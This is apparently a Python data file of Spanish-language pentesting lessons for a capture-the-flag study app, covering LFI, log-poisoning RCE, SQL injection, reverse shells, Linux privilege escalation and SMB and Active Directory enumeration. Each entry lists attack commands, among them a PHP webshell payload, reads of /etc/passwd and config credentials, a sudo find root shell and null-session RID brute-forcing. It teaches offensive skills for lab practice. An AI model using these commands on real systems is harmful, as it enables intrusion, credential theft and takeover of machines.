# Concept wiki for the "Aprender" mode of the web app.
#
# A "concepto" is an atomic, prose-first explanation of ONE idea: que es,
# por que ocurre, cuando aplica, que senales lo delatan y los pasos para
# aprovecharlo. Concepts are interlinked with [[otro-id]] inside the prose,
# and each links out to its practice section (slug) via "section" so el
# lector salta a los comandos concretos con "ver comandos".
#
# A "ruta" (learning path) is an ordered list of concept ids: el orden en que
# conviene leerlos para dominar un area.
#
# Exported into web/data/content.json under "concepts" and "paths" by
# export_web_content.py. Prose sin acentos, igual que guides.py.

CONCEPTS = [
    {
        "id": "lfi",
        "title": "Local File Inclusion (LFI)",
        "phase": "enumeration",
        "section": "web-ficheros-y-ejecucion",
        "summary": "La web incluye un fichero cuyo nombre controlas tu; si no lo valida, lees ficheros del servidor.",
        "que": "Una LFI ocurre cuando una pagina construye la ruta de un fichero a incluir usando un valor que viene del usuario (tipicamente un parametro como ?page=), sin comprobar que ese valor sea uno de los permitidos. El servidor entonces lee y a veces ejecuta el fichero que tu le pidas, no el que el programador esperaba.",
        "porque": "El codigo hace algo como include($_GET['page'].'.php'). El programador asume que page siempre sera 'home' o 'about', pero nada lo obliga. Si metes ../../../../etc/passwd, la funcion de inclusion resuelve esa ruta relativa y sirve el fichero. La causa raiz es confiar en la entrada del usuario para decidir que fichero abrir.",
        "cuando": "Sospecha LFI en cualquier parametro que parezca nombrar una vista, una plantilla, un idioma o un documento: page, file, view, template, lang, doc, include. Sobre todo si el valor aparece reflejado en la URL y el contenido de la pagina cambia segun ese valor.",
        "no_aplica": [
            "El parametro no cambia el contenido de la pagina aunque le mandes ../ o rutas absolutas.",
            "La app usa una lista blanca de vistas validas y rechaza cualquier valor fuera de ella.",
            "El framework normaliza/sanea la ruta antes de tocar el filesystem (basename, whitelist).",
        ],
        "confirmacion": "Pide /etc/passwd con suficientes ../ (o su ruta absoluta si el include no es relativo).",
        "resultado": "Lineas que empiezan por root:x:0:0 en la respuesta. Un error de include con una ruta absoluta tambien cuenta como confirmacion parcial.",
        "necesitas": [
            "Un parametro que la pagina use para nombrar un fichero (page, file, view, template, lang, doc).",
            "Poder inyectar ../ o rutas; si el codigo anade una extension (.php), un wrapper como php://filter para leer el fuente.",
        ],
        "senales": [
            "Un parametro cuyo valor parece un nombre de fichero o de pagina (?page=home, ?file=report).",
            "La respuesta cambia de forma coherente al pedir rutas: ../ te acerca a la raiz, un fichero inexistente da un error de include con la ruta.",
            "Mensajes de error de PHP que filtran rutas absolutas del servidor (failed to open stream).",
            "Puedes leer /etc/passwd (Linux) o C:\\Windows\\win.ini (Windows) via el parametro.",
        ],
        "pasos": [
            "Confirma la lectura con un fichero que siempre existe: pide /etc/passwd con suficientes ../ para llegar a la raiz.",
            "Si el codigo anade una extension (.php), usa un PHP wrapper para leer el fuente en base64 sin que se ejecute, o busca truncar la extension.",
            "Mapea que mas puedes leer: config con credenciales, claves SSH, logs. Cada fichero legible es una pista para la siguiente fase.",
            "Si controlas el contenido de algun fichero que el servidor luego incluye (un log, una sesion, un upload), la LFI se convierte en ejecucion: mira [[lfi-a-rce]].",
        ],
        "commands": [
            {
                "cmd": "curl -s '$URL/?page=../../../../etc/passwd'",
                "why": "Prueba de lectura con un fichero que siempre existe. Los ../ de sobra suben hasta la raiz aunque no sepas la profundidad real del script.",
                "out": "Lineas root:x:0:0. Si aparecen, hay LFI confirmada. Un error de include con una ruta absoluta tambien es util: te dice donde estas en el disco.",
            },
            {
                "cmd": "curl -s '$URL/?page=php://filter/convert.base64-encode/resource=config'",
                "why": "Si el codigo anade .php y ejecuta el fichero, el wrapper php://filter te deja leer el FUENTE en base64 sin que se ejecute. Asi lees configs con credenciales.",
                "out": "Un blob en base64: decodificalo (base64 -d) para ver el codigo PHP. Busca ahi credenciales de BD, claves de API y rutas a otros ficheros jugosos.",
            },
        ],
    },
    {
        "id": "lfi-a-rce",
        "title": "De LFI a ejecucion (RCE)",
        "phase": "access",
        "section": "web-ficheros-y-ejecucion",
        "summary": "Leer ficheros no es el final: si logras que el servidor incluya contenido que tu controlas, ejecutas codigo.",
        "que": "Es el salto de 'puedo leer' a 'puedo ejecutar'. Una [[lfi]] por si sola solo lee, pero si consigues que el fichero incluido contenga codigo PHP que tu has metido antes, ese codigo se ejecuta con los permisos del servidor web y obtienes ejecucion remota de comandos.",
        "porque": "include no solo lee: interpreta PHP. Si logras escribir <?php system($_GET['c']); ?> en algun sitio del servidor y luego apuntas la LFI a ese sitio, el include ejecuta tu payload. Los sitios clasicos donde puedes 'inyectar' ese contenido son ficheros que el servidor escribe con datos tuyos: logs de acceso, ficheros de sesion, cabeceras guardadas o subidas de fichero mal filtradas.",
        "cuando": "Cuando ya confirmaste lectura con LFI y ademas existe algun fichero cuyo contenido puedas influir: el User-Agent acaba en un access.log legible, hay ficheros de sesion en /var/lib/php, o hay un formulario de subida. Sin un punto de inyeccion controlable, la LFI se queda en lectura.",
        "necesitas": [
            "Una [[lfi]] confirmada.",
            "Un fichero cuyo contenido puedas influir: access.log (via User-Agent), una sesion PHP, o un upload sin filtrar.",
            "Saber la ruta exacta de ese fichero en el servidor.",
        ],
        "no_aplica": [
            "No hay ningun fichero en el servidor cuyo contenido controles (logs no legibles, sin uploads, sin sesiones en disco).",
            "El servidor no interpreta PHP en el fichero incluido (p.ej. solo lo muestra como texto).",
            "open_basedir u otra restriccion impide llegar a la ruta del fichero envenenado.",
        ],
        "confirmacion": "Manda un User-Agent con PHP minimo (<?php system($_GET['c']); ?>) y luego incluye el access.log con ?c=id.",
        "resultado": "La salida de id aparece incrustada entre las lineas del log. Eso confirma ejecucion, no solo lectura.",
        "senales": [
            "Puedes leer un log (access.log, auth.log) via la LFI: el log refleja datos que tu envias, como el User-Agent.",
            "Existe una subida de ficheros que no valida bien la extension o el contenido.",
            "Puedes fijar el valor de una cookie de sesion y localizar su fichero en disco.",
        ],
        "pasos": [
            "Elige el vector de inyeccion: log poisoning (mandas PHP en el User-Agent y lo ejecutas incluyendo el log), sesion, o subida.",
            "Inyecta un payload minimo que ejecute un comando parametrizado, y confirma con id o whoami que se ejecuta.",
            "Convierte la ejecucion de un comando en una shell interactiva: lanza una reverse shell ([[reverse-vs-bind]]) y estabilizala ([[tty-stabilization]]).",
            "Con shell ya dentro, cambia de fase: orientate y busca escalada ([[privesc-modelo]]). Los comandos concretos estan en la seccion de practica (ver comandos).",
        ],
        "commands": [
            {
                "cmd": "curl -s '$URL/?page=../../../../var/log/apache2/access.log&c=id'",
                "why": "Log poisoning: antes mandas PHP en tu User-Agent (queda escrito en el access.log) y ahora incluyes ese log via la LFI. El servidor interpreta tu PHP y ejecuta el comando de ?c=.",
                "out": "La salida de id incrustada entre las lineas del log confirma ejecucion. Fijate en el usuario (www-data): es con quien tendras la shell al escalar a reverse shell.",
            },
        ],
    },
    {
        "id": "sqli",
        "title": "Inyeccion SQL (SQLi)",
        "phase": "enumeration",
        "section": "sqli",
        "summary": "Tu entrada acaba dentro de una consulta SQL sin separar datos de codigo; puedes reescribir la consulta.",
        "que": "Una SQLi ocurre cuando la aplicacion construye una consulta SQL concatenando texto que viene del usuario. Como el motor no distingue tu 'dato' del 'codigo' de la consulta, puedes cerrar la cadena original e inyectar tu propia logica: saltarte un login, volcar tablas o, segun el motor, ejecutar comandos.",
        "porque": "El codigo hace query = \"SELECT * FROM users WHERE name='\" + input + \"'\". Si tu input es ' OR '1'='1, la consulta final siempre es verdadera. La causa raiz es la misma que en [[lfi]]: mezclar datos no confiables con la instruccion, en vez de usar consultas parametrizadas que separan ambos.",
        "cuando": "En cualquier campo que alimente una busqueda, un login, un filtro o un id: formularios, parametros de URL, cabeceras. Sospecha si al meter una comilla la aplicacion se rompe o cambia de comportamiento.",
        "no_aplica": [
            "El campo usa consultas parametrizadas/prepared statements (la comilla no rompe nada y el comportamiento no cambia).",
            "El valor se valida contra un tipo estricto (entero, enum) antes de llegar a la consulta.",
            "El ORM escapa o tipa la entrada automaticamente sin concatenar SQL crudo.",
        ],
        "confirmacion": "Anade una comilla simple ' al parametro y compara la respuesta con la peticion normal.",
        "resultado": "Un error de sintaxis SQL, una pagina 500, o un cambio de comportamiento (mas filas, login sin password) frente a la peticion sin comilla.",
        "necesitas": [
            "Un campo que llegue a una consulta SQL: parametro de URL, formulario, cabecera o id.",
            "Ver como reacciona a una comilla ' (error o cambio); para extraer por UNION, el numero de columnas.",
            "Un diccionario o sqlmap si vas a automatizar; paciencia si es a ciegas (blind).",
        ],
        "senales": [
            "Una comilla simple ' provoca un error de SQL o una pagina en blanco/500.",
            "Payloads logicos cambian el resultado: ' OR '1'='1 devuelve mas filas o entra sin password.",
            "La respuesta tarda distinto con un payload de tiempo (blind basada en tiempo).",
            "Diferencias sutiles entre una condicion verdadera y una falsa (blind booleana).",
        ],
        "pasos": [
            "Detecta el punto: mete una comilla y observa el error o el cambio. Deduce si es numerica o entre comillas.",
            "Averigua el numero de columnas (ORDER BY / UNION SELECT) para poder extraer datos por UNION.",
            "Extrae metadatos primero (version, bases de datos, tablas, columnas) y luego los datos que te interesan (usuarios, hashes).",
            "Si es a ciegas, automatiza con una herramienta; los hashes que saques van a la fase de credenciales para crackear y reutilizar.",
        ],
        "commands": [
            {
                "cmd": "sqlmap -u '$URL/item?id=1' --batch --dbs",
                "why": "Cuando ya sospechas SQLi (una comilla rompio la pagina), sqlmap automatiza la deteccion y explotacion. --batch acepta los defaults; --dbs lista las bases de datos como primera prueba de que funciona.",
                "out": "El tipo de inyeccion detectada (boolean, time-based, UNION) y la lista de bases de datos. Con eso, sigue con --tables y -D <db> --dump para extraer usuarios y hashes.",
            },
        ],
    },
    {
        "id": "reverse-vs-bind",
        "title": "Reverse shell vs bind shell",
        "phase": "access",
        "section": "acceso-inicial",
        "summary": "Dos formas de conseguir una shell remota; la direccion de la conexion decide cual funciona detras de un firewall.",
        "que": "Una bind shell abre un puerto EN LA VICTIMA y tu te conectas a el. Una reverse shell hace lo contrario: la victima se conecta HACIA TI, a un listener que tienes abierto. En ambos casos acabas con una shell del objetivo, pero la direccion de la conexion cambia cual es viable.",
        "porque": "Los firewalls casi siempre bloquean conexiones entrantes a la victima pero permiten las salientes. Por eso la reverse shell (victima -> atacante) funciona donde la bind shell (atacante -> victima) falla: la conexion de salida rara vez esta filtrada. Por defecto, piensa siempre en reverse.",
        "cuando": "Reverse: el caso normal, sobre todo si la victima esta tras NAT o firewall. Bind: solo cuando TU no puedes recibir conexiones (estas tras NAT sin port-forward) pero la victima si acepta entrantes. Tras conseguirla, casi siempre toca [[tty-stabilization]].",
        "no_aplica": [
            "No tienes ejecucion de comandos todavia: primero hace falta un vector de RCE.",
            "Un firewall de salida bloquea el puerto que elegiste (usa uno comun: 443, 53, 80).",
            "AV/EDR en la victima bloquea el binario o el payload antes de conectar.",
        ],
        "confirmacion": "Levanta el listener y dispara el payload contra tu propio LHOST/puerto antes de nada mas.",
        "resultado": "El listener muestra 'connect to ... from ...' y un prompt de shell de la victima.",
        "necesitas": [
            "Ejecucion de comandos en la victima (RCE, una inyeccion, un exploit).",
            "Tu IP de atacante (la de la VPN/tun0, no la local) como LHOST y un puerto libre.",
            "El listener abierto ANTES de disparar el payload.",
        ],
        "senales": [
            "Tienes ejecucion de comandos (RCE, [[lfi-a-rce]], una inyeccion) pero aun no una shell interactiva.",
            "Tu listener no recibe nada: revisa que LHOST sea TU IP de atacante (VPN, no la local) y que el puerto no este ocupado ni filtrado.",
            "La shell entra pero es 'tonta': sin Ctrl+C, sin flechas, sin autocompletado -> necesita estabilizarse.",
        ],
        "pasos": [
            "Abre SIEMPRE el listener antes de disparar el payload; si no, la conexion llega a la nada y la pierdes.",
            "Genera el payload con TU IP de atacante como LHOST y un puerto que estes escuchando (usa el generador de la app).",
            "Dispara el payload por tu vector de ejecucion y espera el 'connect received' en el listener.",
            "Nada mas entrar, estabiliza la shell: mira [[tty-stabilization]].",
        ],
        "commands": [
            {
                "cmd": "nc -lvnp 4444",
                "why": "Pone tu maquina a escuchar para recibir una reverse shell. -l escucha, -v verboso, -n sin DNS, -p el puerto. Debe estar abierto ANTES de lanzar el payload.",
                "out": "'listening on [any] 4444' y luego 'connect to ... from ...' cuando entre. Si no entra nada, el LHOST/puerto del payload no coincide o hay un firewall de salida.",
            },
        ],
    },
    {
        "id": "tty-stabilization",
        "title": "Estabilizar la shell (TTY)",
        "phase": "access",
        "section": "acceso-inicial",
        "summary": "Convertir una shell tonta en una TTY completa: sin esto, Ctrl+C te mata la sesion y muchos comandos fallan.",
        "que": "Una reverse shell recien llegada no es una terminal de verdad: no tiene TTY. Eso significa sin autocompletado, sin historial, sin flechas, y Ctrl+C mata TODA la shell en vez de el comando actual. Estabilizar es darle una pseudo-TTY para trabajar como en una terminal normal.",
        "porque": "Programas como su, ssh, sudo, passwd o los editores exigen un TTY y fallan ('must be run from a terminal') en una shell tonta. Ademas, sin estabilizar, un Ctrl+C accidental te deja fuera y hay que repetir todo el acceso. Estabilizar temprano ahorra sustos.",
        "cuando": "Justo despues de recibir una [[reverse-vs-bind]] shell en Linux, antes de ponerte a enumerar privesc. En Windows el concepto no aplica igual (se suele saltar a evil-winrm o a una shell de Meterpreter).",
        "necesitas": [
            "Una shell remota ya conectada (reverse o bind).",
            "python, python3, script o socat disponible en la victima para la pseudo-TTY.",
        ],
        "no_aplica": [
            "Ya tienes una shell completa (SSH, evil-winrm, Meterpreter con pty propio): no hace falta estabilizar.",
            "La victima no tiene ningun interprete (python/perl/script) para crear la pseudo-TTY: usa socat o resignate a la shell tonta.",
        ],
        "confirmacion": "Lanza el pty.spawn de python y prueba Ctrl+C o las flechas del historial.",
        "resultado": "El prompt cambia a usuario@host, Ctrl+C mata solo el comando actual (no la shell), y las flechas navegan el historial.",
        "senales": [
            "El prompt no muestra usuario@host, o es un simple $ sin mas.",
            "Las flechas imprimen ^[[A en vez de moverse por el historial.",
            "su o sudo responden 'must be run from a terminal'.",
        ],
        "pasos": [
            "Lanza una pseudo-TTY con python3/pty (o script /dev/null si no hay python).",
            "Exporta un TERM valido (export TERM=xterm) para que funcionen editores y clear.",
            "Pon la shell en background (Ctrl+Z), ajusta tu terminal con stty raw -echo y vuelve con fg.",
            "Ya con TTY estable, arranca la enumeracion (whoami/id, sudo -l) sin miedo a Ctrl+C.",
        ],
        "commands": [
            {
                "cmd": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
                "why": "Crea la pseudo-TTY con la que ya funcionan su/sudo/passwd. Es el primer paso y el mas portable si la victima tiene python3.",
                "out": "El prompt suele cambiar a usuario@host. Si no hay python3, prueba python o 'script -qc /bin/bash /dev/null'.",
            },
            {
                "cmd": "stty raw -echo; fg",
                "why": "Se ejecuta EN TU KALI tras poner la shell en background (Ctrl+Z). Pasa tu terminal a modo raw para tener Ctrl+C, flechas y autocompletado dentro de la shell remota.",
                "out": "Al volver (fg) la shell ya se comporta como una terminal normal. Si ves letras dobladas o rota, ajusta filas/columnas con stty rows/cols.",
            },
        ],
    },
    {
        "id": "privesc-modelo",
        "title": "El modelo de la escalada de privilegios",
        "phase": "privesc",
        "section": "linux-privesc",
        "summary": "Toda privesc es lo mismo: algo mas privilegiado ejecuta, lee o confia en algo que tu puedes controlar.",
        "que": "Escalar privilegios es encontrar un punto donde un proceso o usuario mas poderoso (normalmente root) depende de algo que tu puedes modificar o influir: un binario, un script, una ruta, un fichero de config, una variable de entorno. No es magia ni un exploit unico: es esa relacion de confianza rota.",
        "porque": "Los sistemas ejecutan tareas privilegiadas continuamente (cron, servicios, binarios SUID). Si cualquiera de esas tareas toca algo escribible o controlable por tu usuario, heredas su privilegio. La causa raiz siempre es una frontera de confianza mal puesta.",
        "cuando": "Siempre que tengas una shell de usuario normal y quieras root. Antes de explotar toca enumerar de forma sistematica ([[enum-privesc-linux]]): [[sudo-abuse]], [[suid]] y [[cron-abuse]] son los vectores mas comunes, pero hay muchos mas (capabilities, PATH, wildcard, grupos, NFS, kernel); empieza por los rapidos.",
        "necesitas": [
            "Una shell de usuario normal en la maquina.",
        ],
        "no_aplica": [
            "Ya eres root/uid=0: no hay nada que escalar.",
            "No tienes ninguna forma de ejecutar comandos todavia (esto es post-shell, no acceso inicial).",
        ],
        "confirmacion": "id; groups; sudo -l como primer barrido.",
        "resultado": "Un grupo peligroso (docker/lxd/disk), una entrada NOPASSWD en sudo, o un binario SUID no estandar.",
        "senales": [
            "Perteneces a un grupo potente (docker, lxd, disk, adm): a menudo es root casi directo.",
            "Existe un binario, script o tarea que corre como root y que tu puedes leer o escribir.",
            "Hay credenciales reutilizables en disco que pertenecen a otro usuario.",
        ],
        "pasos": [
            "Orientate: whoami/id/groups. Un grupo peligroso puede acortar todo el camino.",
            "Enumera en orden por rentabilidad: primero sudo ([[sudo-abuse]]) y SUID ([[suid]]), luego cron ([[cron-abuse]]) y configs.",
            "Para cada binario o vector que salga, busca la receta exacta (GTFOBins) antes de improvisar.",
            "Explota, confirma con id que eres uid=0, y documenta el root cause para el writeup.",
        ],
        "commands": [
            {
                "cmd": "id; groups",
                "why": "El punto de partida. Los grupos deciden atajos: docker/lxd permiten escapar a root montando el disco del host; sin grupos jugosos, toca la enumeracion sistematica.",
                "out": "Tu uid/gid y grupos. docker/lxd -> escape casi directo. adm -> lectura de logs. disk -> lectura cruda del disco (incluido /etc/shadow).",
            },
        ],
    },
    {
        "id": "suid",
        "title": "Binarios SUID",
        "phase": "privesc",
        "section": "linux-privesc",
        "summary": "Un binario SUID se ejecuta con los privilegios de su dueno (a menudo root), no con los tuyos.",
        "que": "El bit SUID hace que un ejecutable corra siempre como su propietario, sin importar quien lo lance. Si el dueno es root y el binario permite ejecutar comandos, leer/escribir ficheros o lanzar otra shell, puedes abusar de el para actuar como root. Es una aplicacion directa del [[privesc-modelo]].",
        "porque": "SUID existe para casos legitimos (passwd necesita tocar /etc/shadow). El problema es cuando un binario con SUID tiene una funcion que permite salir a una shell o leer ficheros arbitrarios: entonces esa capacidad se ejecuta como root. GTFOBins cataloga exactamente que binarios son abusables y como.",
        "cuando": "En la fase de privesc Linux, justo despues de mirar [[sudo-abuse]]. Busca binarios SUID que NO sean del sistema base o cuya version sea conocida por ser abusable.",
        "no_aplica": [
            "Todos los SUID listados son binarios estandar del sistema sin funcion de escape conocida en GTFOBins.",
            "El binario SUID es de tu propio usuario (dueno = tu uid, no root): no gana privilegio.",
        ],
        "confirmacion": "Busca el binario candidato en GTFOBins (seccion SUID) y ejecuta su linea de abuso exacta.",
        "resultado": "Un prompt nuevo con # en vez de $, y euid=0 en id.",
        "necesitas": [
            "Una shell de usuario en la maquina.",
            "Un binario con bit SUID que NO sea del sistema base (o uno abusable segun GTFOBins).",
        ],
        "senales": [
            "find de SUID devuelve binarios raros (nmap, find, cp, python, vim, tar) fuera de los tipicos.",
            "Un binario a medida del reto con el bit SUID puesto.",
            "El binario aparece en GTFOBins con la etiqueta SUID.",
        ],
        "pasos": [
            "Lista los binarios SUID del sistema.",
            "Descarta los normales (passwd, sudo, mount, ping) y quedate con lo inusual.",
            "Busca cada candidato en GTFOBins filtrando por 'SUID': te da la linea exacta.",
            "Ejecuta el abuso y confirma con id que tienes euid=0.",
        ],
        "commands": [
            {
                "cmd": "find / -perm -4000 -type f 2>/dev/null",
                "why": "Lista todos los binarios con bit SUID. -perm -4000 filtra justo ese bit; 2>/dev/null oculta el ruido de permiso denegado.",
                "out": "Rutas de binarios SUID. Ignora los tipicos del sistema; cualquier cosa rara o a medida -> GTFOBins. Anota tambien la version si es un binario conocido.",
            },
        ],
    },
    {
        "id": "sudo-abuse",
        "title": "Abuso de sudo",
        "phase": "privesc",
        "section": "linux-privesc",
        "summary": "sudo -l te dice que puedes ejecutar como root; muchos binarios permiten saltar de ahi a una shell root.",
        "que": "sudo permite a un usuario ejecutar comandos concretos como otro (normalmente root). Si tu usuario tiene permitido ejecutar un binario que ademas puede lanzar una shell, leer/escribir ficheros o ejecutar codigo, ese permiso puntual se convierte en root total. Otra cara del [[privesc-modelo]].",
        "porque": "El admin concede sudo sobre un binario pensando que solo hace su funcion, pero muchos binarios tienen funciones secundarias (un editor puede abrir una shell, less puede ejecutar comandos). GTFOBins lista para cada uno como escapar. Ademas fallos como env_keep o rutas relativas amplian el abuso.",
        "cuando": "Es lo PRIMERO que se mira en privesc Linux por su alta rentabilidad. En cuanto tengas una shell estable ([[tty-stabilization]]), lanza sudo -l.",
        "necesitas": [
            "Una shell de usuario con acceso a sudo (aunque sea sobre un solo binario).",
        ],
        "no_aplica": [
            "sudo -l pide password y no la tienes.",
            "El binario permitido no aparece en GTFOBins y no tiene funcion de escape conocida (editor sin !shell, etc).",
        ],
        "confirmacion": "Ejecuta sudo -l y busca cada binario listado en GTFOBins bajo 'sudo'.",
        "resultado": "Lineas '(root) NOPASSWD: /ruta/binario'. Tras aplicar la receta de GTFOBins, un prompt # con uid=0.",
        "senales": [
            "sudo -l muestra entradas '(root) NOPASSWD: /ruta/bin' (ni siquiera piden password).",
            "El binario permitido aparece en GTFOBins bajo 'sudo'.",
            "Ves env_keep+=LD_PRELOAD o rutas relativas: vectores extra de abuso.",
        ],
        "pasos": [
            "Ejecuta sudo -l para ver que tienes permitido y si es sin password.",
            "Busca el binario permitido en GTFOBins, seccion 'sudo'.",
            "Aplica la linea de escape (suele forzar una shell o ejecutar un comando como root).",
            "Confirma con id; si eres root, recoge la flag y anota el vector.",
        ],
        "commands": [
            {
                "cmd": "sudo -l",
                "why": "Enumera exactamente que comandos puedes correr como otro usuario. Es el vector mas rapido y comun; muchas rooms se resuelven aqui sin buscar mas.",
                "out": "Entradas '(root) NOPASSWD: ...'. Cada binario permitido -> GTFOBins. Si pide password y no la tienes, este vector queda en pausa.",
            },
            {
                "cmd": "sudo /usr/bin/find . -exec /bin/sh \\; -quit",
                "why": "Ejemplo tipico de GTFOBins: si puedes sudo find, su flag -exec lanza una shell heredando el privilegio root de sudo.",
                "out": "Prompt # y id con uid=0. Cambia find por el binario concreto que te permita tu sudo -l; la idea (forzar una shell) es la misma.",
            },
        ],
    },
    {
        "id": "cron-abuse",
        "title": "Tareas cron escribibles",
        "phase": "privesc",
        "section": "linux-privesc",
        "summary": "Si root ejecuta periodicamente un script o binario que tu puedes modificar, tu codigo correra como root.",
        "que": "cron ejecuta tareas programadas, a menudo como root. Si una de esas tareas llama a un script, binario o ruta que tu usuario puede escribir (o si usa comodines o rutas relativas manipulables), puedes inyectar tu propio comando y esperar a que cron lo ejecute con privilegios. Es el [[privesc-modelo]] aplicado al tiempo.",
        "porque": "Los admins programan mantenimiento (backups, limpiezas) como root y a veces dejan el script en una ruta escribible por otros, o usan comodines (tar *) que un atacante puede secuestrar creando ficheros con nombres especiales. cron lo ejecuta tal cual, sin validar quien toco el script.",
        "cuando": "Cuando sudo ([[sudo-abuse]]) y SUID ([[suid]]) no dieron nada. cron es mas lento porque hay que esperar a que la tarea corra, pero es un vector muy comun en rooms.",
        "necesitas": [
            "Lectura de /etc/crontab, /etc/cron.d o del crontab del usuario objetivo.",
            "Un script/binario invocado por esa tarea que tu usuario pueda escribir (directo, por wildcard, o por PATH).",
        ],
        "no_aplica": [
            "Ninguna tarea root referencia un script o ruta que puedas escribir.",
            "Los scripts invocados usan rutas absolutas y permisos correctos (root:root, 700) sin comodines.",
        ],
        "confirmacion": "Comprueba con ls -l si el script que ejecuta root es escribible por tu usuario o grupo.",
        "resultado": "Permiso de escritura (w) para ti en el script; tras inyectar tu payload y esperar el ciclo de cron, una shell/binario root.",
        "senales": [
            "Un script referenciado en cron es escribible por tu usuario o su grupo.",
            "La tarea usa una ruta relativa o un comodin (*) en un directorio donde puedes crear ficheros.",
            "Aparecen procesos que arrancan cada pocos minutos (pspy lo revela) corriendo como root.",
        ],
        "pasos": [
            "Lee las tareas programadas del sistema y de otros usuarios.",
            "Comprueba permisos de los scripts/binarios que invocan (ls -l): busca los escribibles.",
            "Inyecta tu payload (una reverse shell o el bit SUID a bash) en el punto controlable.",
            "Espera a que cron ejecute y recoge tu shell/binario root.",
        ],
        "commands": [
            {
                "cmd": "cat /etc/crontab; ls -la /etc/cron.*",
                "why": "Muestra las tareas programadas del sistema y con que frecuencia corren. Es el primer sitio donde mirar que ejecuta root de forma automatica.",
                "out": "Lineas con horario, usuario (root) y el comando/script. Anota los scripts que corren como root: el siguiente paso es ver si puedes escribirlos.",
            },
            {
                "cmd": "ls -l /ruta/al/script_de_cron.sh",
                "why": "Comprueba si el script que ejecuta root es escribible por ti. Ese permiso de escritura es justo la frontera de confianza rota que necesitas.",
                "out": "Los permisos y el dueno. Si tu usuario o un grupo tuyo tiene w, puedes inyectar comandos. Si no, busca comodines o rutas relativas manipulables.",
            },
        ],
    },
    {
        "id": "smb-enum",
        "title": "Enumeracion de SMB",
        "phase": "enumeration",
        "section": "recon-y-servicios",
        "summary": "El puerto 445 suele regalar shares legibles, nombres de usuario y el dominio; comprueba siempre el acceso anonimo primero.",
        "que": "SMB (445, y 139) es el protocolo de comparticion de ficheros de Windows. Enumerarlo consiste en listar sus shares (carpetas compartidas), ver a cuales puedes acceder sin o con credenciales, y sacar informacion del sistema y del dominio. Es una de las superficies mas rentables en rooms Windows/AD.",
        "porque": "Muchas configuraciones permiten sesion nula o de invitado, dejando shares legibles con backups, configs o credenciales. Y aunque no haya acceso anonimo, SMB filtra el nombre del equipo, el dominio y a veces la lista de usuarios, que alimentan el resto del ataque (spraying, [[kerberos]]).",
        "cuando": "Siempre que el recon muestre 445 abierto. Es de las primeras cosas a enumerar; en un DC ademas se combina con LDAP y Kerberos ([[ad-modelo]]).",
        "necesitas": [
            "El puerto 445 (o 139) abierto en el objetivo.",
        ],
        "no_aplica": [
            "SMB firmado y sin sesion nula/guest, y no tienes ninguna credencial que probar.",
            "El servicio en 445 no es realmente SMB (honeypot o servicio remapeado).",
        ],
        "confirmacion": "nxc smb $IP -u '' -p '' --shares para probar sesion nula.",
        "resultado": "Columna READ/WRITE por share; un READ fuera de IPC$ es acceso real. El header confirma nombre de equipo y dominio.",
        "senales": [
            "nmap marca 445/tcp open microsoft-ds o el script smb saca el dominio.",
            "Un share con permiso READ que no sea IPC$ (a menudo backups, transfer, dev).",
            "Sesion nula/guest aceptada: puedes listar sin credenciales.",
        ],
        "pasos": [
            "Comprueba acceso anonimo listando shares con usuario vacio o guest.",
            "Entra a cada share legible y saquea configs, backups y ficheros de usuario.",
            "Si tienes credenciales, repite: suele abrir mas shares y, si eres admin local, ejecucion.",
            "Extrae usuarios (rid-brute) para alimentar spraying y roasting en AD.",
        ],
        "commands": [
            {
                "cmd": "nxc smb $IP -u '' -p '' --shares",
                "why": "Comprueba sesion nula y lista los shares de golpe. Es la prueba mas rentable en SMB: un share legible te ahorra toda la fase de explotacion.",
                "out": "Columna READ/WRITE por share. Un READ fuera de IPC$ es saqueo directo. El encabezado tambien confirma nombre de equipo y dominio.",
            },
            {
                "cmd": "nxc smb $IP -u 'guest' -p '' --rid-brute",
                "why": "Si hay acceso guest/nulo, itera los RID para sacar la lista de usuarios del dominio sin credenciales. Necesitas usuarios validos antes de rociar passwords.",
                "out": "Lineas SidTypeUser = usuarios reales. Extrae los nombres (sin las cuentas de maquina terminadas en $) a users.txt para spraying y roasting.",
            },
        ],
    },
    {
        "id": "ad-modelo",
        "title": "Como se ataca Active Directory",
        "phase": "access",
        "section": "active-directory",
        "summary": "En AD no explotas una maquina: transformas una identidad en mas permisos, en cadena, hasta Domain Admin.",
        "que": "Active Directory es el directorio que gestiona usuarios, equipos y permisos de una red Windows. Atacarlo no va de un exploit puntual, sino de conseguir una identidad (un usuario) y usar sus permisos para conseguir otra mas fuerte, repitiendo hasta llegar a Domain Admin o al hash de krbtgt.",
        "porque": "AD esta hecho de relaciones de confianza (grupos, delegaciones, ACLs, sesiones). Cada credencial abre nuevas relaciones que explotar. Por eso la mentalidad es distinta: importa mas el grafo de permisos ([[bloodhound]] lo mapea) que la version de un servicio.",
        "cuando": "En cuanto el recon confirme un DC (puertos 88 Kerberos + 389 LDAP + 445). El trabajo previo imprescindible es resolver nombres y hora, o Kerberos falla con errores confusos.",
        "necesitas": [
            "Un DC accesible (puertos 88/389/445 tipicamente).",
        ],
        "no_aplica": [
            "El objetivo es una maquina Windows standalone sin dominio (no hay 88/389 abiertos).",
            "No tienes ninguna via de conseguir un primer usuario (sin acceso anonimo, sin usuarios enumerables).",
        ],
        "confirmacion": "Escanea los puertos tipicos de DC y confirma que 88 (Kerberos) responde.",
        "resultado": "88+389+445 abiertos en el mismo host, y los scripts de nmap/enum filtran el nombre del dominio.",
        "senales": [
            "Puertos 88, 389, 445, 636, 3268 abiertos en el mismo host.",
            "nmap/enum filtra un nombre de dominio (algo.local) y el hostname del DC.",
            "Errores de 'clock skew' al usar herramientas: tu reloj no cuadra con el DC.",
        ],
        "pasos": [
            "Prepara nombres (/etc/hosts) y sincroniza la hora con el DC.",
            "Consigue el primer usuario: enum de SMB ([[smb-enum]]), rid-brute y password spraying controlado.",
            "Saca hashes crackeables por Kerberos ([[asrep-kerberoast]]) y mapea permisos con [[bloodhound]].",
            "Extrae hashes del objetivo y autentica con [[ntlm-pth]] hasta Domain Admin.",
        ],
        "commands": [
            {
                "cmd": "nmap -sC -sV -Pn -p 53,88,135,139,389,445,464,636,3268,5985 $IP",
                "why": "Escanea los puertos tipicos de un DC de una vez. La combinacion 88+389+445 confirma que estas ante un dominio y no una maquina suelta.",
                "out": "Puerto 88 abierto = DC. Los scripts LDAP/SMB filtran el nombre del dominio y del DC: anotalos para /etc/hosts antes de seguir.",
            },
        ],
    },
    {
        "id": "kerberos",
        "title": "Kerberos en dos minutos",
        "phase": "access",
        "section": "active-directory",
